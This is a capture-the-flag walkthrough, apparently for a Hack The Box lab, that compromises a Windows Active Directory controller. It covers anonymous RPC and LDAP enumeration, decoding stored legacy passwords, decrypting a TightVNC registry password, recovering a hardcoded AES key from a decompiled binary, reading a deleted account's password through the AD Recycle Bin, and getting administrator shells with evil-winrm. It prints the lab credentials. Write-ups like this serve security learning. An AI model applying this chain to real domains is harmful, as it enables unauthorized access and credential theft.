# Enumeration
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 06:20 EDT
Nmap scan report for 10.10.10.182
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-29 10:22:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m46s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-29T10:23:00
|_  start_date: 2020-03-29T10:08:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.55 seconds
```
## Initial Foothold

**SMB:**
```bash
smbclient -N -L //10.10.10.182
smbmap -H 10.10.10.182
crackmapexec -u '' -p '' --shares 
```

Found nothing, moved to **RPC:** </br>
```bash
rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers 
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

I copied all to a file called users, and sorted it with the command: ```cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}'``` </br> </br>
**LDAP:** </br>
To enumerate LDAP, first I’ll get the naming context: </br>
**ldapsearch -h10.10.10.182 -x-sbase namingcontexts** </br>
```bash
# extended LDIF
#
# LDAPv3
# base <>(default)with scope baseObject
# filter: (objectclass=*)# requesting: namingcontexts 
#
#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```

Dump all to a file with: </br>
```ldapsearch -h10.10.10.182 -x-b"DC=cascade,DC=local">ldap_enum``` </br>
After we outputed the  ldap information to a file, we can sort it in a way we'll see what sticks out: </br>
```cat ldap-anonymous | awk '{print $1}' | sort | uniq -c | sort -nr``` </br>
If you want to also get rid of the base64, we can do that: </br> 
```cat ldap-anonymous | awk '{print $1}' | sort | uniq -c | sort -nr | grep ':'``` </br>
Ryan Thompson data had something interesting in it: </br>
```bash
Ryan Thompson data had something interesting in it:
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132299789414187261
lastLogoff: 0
lastLogon: 132299789469255357
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

**cascadeLegacyPwd: clk0bjVldmE=** </br>
Looks like base64, I decoded it:```echo clk0bjVldmE= | base64 -d``` </br>
The result was: ```rY4n5eva``` </br> </br>
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
```

Only smb option was available: </br>
```crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182``` </br> </br>
**Shares Enumeration:** </br>
```bash
smbclient --user r.thompson //10.10.10.182/data rY4n5eva
mask ""
recurse ON 
prompt OFF 
mget *
```

The interesting files I found: </br>
**VNC Install.reg:** </br>
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f </br>
**Meeting_Notes_June_2018.html:** </br>
"We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password)." </br> </br>
The line ```"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f``` looked very interesting. </br>
First I tried to decrypt it with hex but it didn’t seem to work, I then found out that ```TightVNC``` stores the password in the register encrypted with a static key. </br>
I found a way to decrypt it using [GitHub](https://github.com/frizb/PasswordDecrypts) </br>
I used this command: ```echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass``` </br>
Decrypted password: sT333ve2 </br> </br>
Tried using winrm this time: ```crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2``` </br>
And it worked: </br>
I used evil-winrm and got a shell: ```evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182``` </br>
cd ```C:\Users\s.smith\desktop``` -> type ```user.txt``` -> Got the user flag. </br>
# Privilege Escalation
Before getting into the winrm shell I just got, I also tried to see if there's anything interesting within the smb shares: </br>
```crackmapexec smb -u s.smith-p sT333ve2 --shares 10.10.10.182``` </br>
I found a share called Audit that contained some executable and database files, I searched for it in the shell I got, there was a ```c:\shares\``` directory,  but I didn't have permissions to access it , but I could just go into the Audit folder inside: </br>
```cd C:\shares\audit``` </br>
I copied all of the files to my Kali Linux: </br>
```bash
mask ""
recurse ON 
prompt OFF 
mget *
```

I first checked the database file, and found out an encrypted password inside: </br>
```1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local``` </br>
Couldn't decode it with base64, thinking it was encrypted somehow. </br>
I used DNSpy to investigate the ```CascAudit.exe``` file, and I found out exactly how it encrypts the password, I chose to modify the code and decrypt it: </br> </br>
**Modified Code:** </br>
```bash
Imports System
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
	' Token: 0x02000007 RID: 7
	Public Class Crypto
		' Token: 0x06000012 RID: 18 RVA: 0x00002290 File Offset: 0x00000690
		Public Shared Function EncryptString(Plaintext As String, Key As String) As String
			Dim bytes As Byte() = Encoding.UTF8.GetBytes(Plaintext)
			Dim aes As Aes = Aes.Create()
			aes.BlockSize = 128
			aes.KeySize = 128
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842")
			aes.Key = Encoding.UTF8.GetBytes(Key)
			aes.Mode = CipherMode.CBC
			Dim result As String
			Using memoryStream As MemoryStream = New MemoryStream()
				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
					cryptoStream.Write(bytes, 0, bytes.Length)
					cryptoStream.FlushFinalBlock()
				End Using
				result = Convert.ToBase64String(memoryStream.ToArray())
			End Using
			Return result
		End Function

		' Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760
		Public Shared Function DecryptString(EncryptedString As String, Key As String) As String
			Dim array As Byte() = Convert.FromBase64String(EncryptedString)
			Dim aes As Aes = Aes.Create()
			aes.KeySize = 128
			aes.BlockSize = 128
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842")
			aes.Mode = CipherMode.CBC
			aes.Key = Encoding.UTF8.GetBytes(Key)
			Dim [string] As String
			Using memoryStream As MemoryStream = New MemoryStream(array)
				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)
					' The following expression was wrapped in a checked-expression
					Dim array2 As Byte() = New Byte(array.Length - 1 + 1 - 1) {}
					cryptoStream.Read(array2, 0, array2.Length)
					[string] = Encoding.UTF8.GetString(array2)
				End Using
			End Using
			Return [string]
		End Function

		' Token: 0x04000006 RID: 6
		Public Const DefaultIV As String = "1tdyjCbY1Ix49842"

		' Token: 0x04000007 RID: 7
		Public Const Keysize As Integer = 128
	End Class

Public Class test
Public Sub Main()
Dim password As String = String.Empty
Console.WriteLine(Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"))
End Sub
End Class
```

It worked, the password is: ```w3lc0meFr31nd``` </br>
I tried using crackmapexec again: </br>
```crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd``` </br>
```crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd``` </br>
Only winrm worked, so I got in and started to investigate ```arksvc``` user. </br> </br>
**Enumeration:** </br>
```net user arksvc``` </br>
Arksvc is a a member of ```AD Recycle Bin``` group </br>
**AD Recycle Bin:** </br>
AD Recycle Bin is a well-know Windows group. Active Directory Object Recovery (or Recycle Bin) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. </br>
Examples of Querying Deleted Active Directory users source: </br>
https://opentechtips.com/how-to-query-deleted-ad-users-with-powershell/ </br> </br>
I first listed all of the deleted users: ```Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *``` </br>
I found TempAdmin user there, </br>
I queried him: ```Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *``` </br>
And found this: </br>
**cascadeLegacyPwd:** YmFDVDNyMWFOMDBkbGVz </br>
Decrypted it with: ```echo YmFDVDNyMWFOMDBkbGVz | base64 -d``` </br>
The result: baCT3r1aN00dles </br> </br>
This password worked for the main administrator account, as it was written in the 'Meeting_Notes_June_2018.html' file: </br>
```Username is TempAdmin (password is the same as the normal admin account password).``` </br> </br>
```bash
evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182
cd :\Users\Administrator\desktop
type root.txt
```

It worked. I got the root flag. </br>











